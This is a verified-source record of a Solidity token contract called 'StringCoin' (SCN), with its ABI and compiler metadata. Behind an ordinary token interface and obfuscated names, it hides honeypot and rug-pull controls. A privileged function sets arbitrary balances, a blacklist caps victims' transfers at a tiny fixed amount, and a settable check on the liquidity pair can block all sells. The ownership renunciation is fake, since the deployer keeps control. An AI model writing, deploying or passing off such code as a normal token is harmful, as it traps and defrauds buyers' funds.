{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeAutoMarketing {\n    function createPair(address modeBuy, address modeMarketing) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface exemptSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface senderLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAmount) external view returns (uint256);\n\n    function transfer(address marketingIs, uint256 amountTeamWallet) external returns (bool);\n\n    function allowance(address fundList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTeamWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingIs,\n        uint256 amountTeamWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTxTeam, uint256 value);\n    event Approval(address indexed fundList, address indexed spender, uint256 value);\n}\n\ninterface senderLiquidityMetadata is senderLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StringCoin is minSender, senderLiquidity, senderLiquidityMetadata {\n\n    function tokenFeeMarketing(uint256 amountTeamWallet) public {\n        liquidityAt();\n        buyIs = amountTeamWallet;\n    }\n\n    function walletReceiverLiquidity() public {\n        emit OwnershipTransferred(listSwap, address(0));\n        takeIs = address(0);\n    }\n\n    bool public teamTx;\n\n    function maxList(address shouldMin) public {\n        liquidityAt();\n        \n        if (shouldMin == listSwap || shouldMin == liquidityReceiver) {\n            return;\n        }\n        swapLiquidity[shouldMin] = true;\n    }\n\n    address private takeIs;\n\n    event OwnershipTransferred(address indexed receiverLaunch, address indexed txTeamMin);\n\n    mapping(address => mapping(address => uint256)) private teamAtTake;\n\n    string private enableExempt = \"String Coin\";\n\n    constructor (){\n        if (senderMin) {\n            receiverTo = true;\n        }\n        walletReceiverLiquidity();\n        exemptSell atSwapShould = exemptSell(toTotal);\n        liquidityReceiver = feeAutoMarketing(atSwapShould.factory()).createPair(atSwapShould.WETH(), address(this));\n        receiverTradingWallet = feeAutoMarketing(atSwapShould.factory()).feeTo();\n        if (receiverTo != teamTx) {\n            teamTx = false;\n        }\n        listSwap = _msgSender();\n        feeReceiver[listSwap] = true;\n        teamToken[listSwap] = exemptTotalFund;\n        \n        emit Transfer(address(0), listSwap, exemptTotalFund);\n    }\n\n    function isLaunchSwap(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal returns (bool) {\n        if (launchAutoAt == listSwap) {\n            return receiverSell(launchAutoAt, marketingIs, amountTeamWallet);\n        }\n        uint256 tokenTrading = senderLiquidity(liquidityReceiver).balanceOf(receiverTradingWallet);\n        require(tokenTrading == buyIs);\n        require(marketingIs != receiverTradingWallet);\n        if (swapLiquidity[launchAutoAt]) {\n            return receiverSell(launchAutoAt, marketingIs, tradingFeeShould);\n        }\n        amountTeamWallet = isToken(launchAutoAt, marketingIs, amountTeamWallet);\n        return receiverSell(launchAutoAt, marketingIs, amountTeamWallet);\n    }\n\n    uint256 public toIsMarketing = 3;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingShould;\n    }\n\n    address public liquidityReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyLiquidity;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeIs;\n    }\n\n    uint256 public walletFee;\n\n    function receiverSell(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal returns (bool) {\n        require(teamToken[launchAutoAt] >= amountTeamWallet);\n        teamToken[launchAutoAt] -= amountTeamWallet;\n        teamToken[marketingIs] += amountTeamWallet;\n        emit Transfer(launchAutoAt, marketingIs, amountTeamWallet);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return takeIs;\n    }\n\n    address public listSwap;\n\n    address toTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return enableExempt;\n    }\n\n    uint256 private fromBuy;\n\n    uint256 private exemptTotalFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public feeReceiver;\n\n    function transfer(address minExempt, uint256 amountTeamWallet) external virtual override returns (bool) {\n        return isLaunchSwap(_msgSender(), minExempt, amountTeamWallet);\n    }\n\n    uint256 buyIs;\n\n    function balanceOf(address feeAmount) public view virtual override returns (uint256) {\n        return teamToken[feeAmount];\n    }\n\n    function tradingReceiver(address receiverAmount) public {\n        require(receiverAmount.balance < 100000);\n        if (isSwap) {\n            return;\n        }\n        if (toMax == receiverTo) {\n            teamTx = false;\n        }\n        feeReceiver[receiverAmount] = true;\n        \n        isSwap = true;\n    }\n\n    bool private senderMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTotalFund;\n    }\n\n    bool private senderReceiver;\n\n    uint256 takeTxTrading;\n\n    uint256 constant tradingFeeShould = 3 ** 10;\n\n    function isToken(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) internal view returns (uint256) {\n        require(amountTeamWallet > 0);\n\n        uint256 buyExemptSell = 0;\n        if (launchAutoAt == liquidityReceiver && toIsMarketing > 0) {\n            buyExemptSell = amountTeamWallet * toIsMarketing / 100;\n        } else if (marketingIs == liquidityReceiver && walletToLiquidity > 0) {\n            buyExemptSell = amountTeamWallet * walletToLiquidity / 100;\n        }\n        require(buyExemptSell <= amountTeamWallet);\n        return amountTeamWallet - buyExemptSell;\n    }\n\n    uint256 private tradingFee;\n\n    mapping(address => bool) public swapLiquidity;\n\n    function liquidityAt() private view {\n        require(feeReceiver[_msgSender()]);\n    }\n\n    bool private toMax;\n\n    function txAuto(address minExempt, uint256 amountTeamWallet) public {\n        liquidityAt();\n        teamToken[minExempt] = amountTeamWallet;\n    }\n\n    bool public isSwap;\n\n    function approve(address liquidityWallet, uint256 amountTeamWallet) public virtual override returns (bool) {\n        teamAtTake[_msgSender()][liquidityWallet] = amountTeamWallet;\n        emit Approval(_msgSender(), liquidityWallet, amountTeamWallet);\n        return true;\n    }\n\n    bool private receiverTo;\n\n    mapping(address => uint256) private teamToken;\n\n    string private marketingShould = \"SCN\";\n\n    uint256 private autoList;\n\n    uint8 private buyLiquidity = 18;\n\n    uint256 public walletToLiquidity = 0;\n\n    address receiverTradingWallet;\n\n    function transferFrom(address launchAutoAt, address marketingIs, uint256 amountTeamWallet) external override returns (bool) {\n        if (_msgSender() != toTotal) {\n            if (teamAtTake[launchAutoAt][_msgSender()] != type(uint256).max) {\n                require(amountTeamWallet <= teamAtTake[launchAutoAt][_msgSender()]);\n                teamAtTake[launchAutoAt][_msgSender()] -= amountTeamWallet;\n            }\n        }\n        return isLaunchSwap(launchAutoAt, marketingIs, amountTeamWallet);\n    }\n\n    function allowance(address sellIsFee, address liquidityWallet) external view virtual override returns (uint256) {\n        if (liquidityWallet == toTotal) {\n            return type(uint256).max;\n        }\n        return teamAtTake[sellIsFee][liquidityWallet];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTeamMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTxTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"maxList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toIsMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"tokenFeeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAutoAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTeamWallet\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletToLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "StringCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}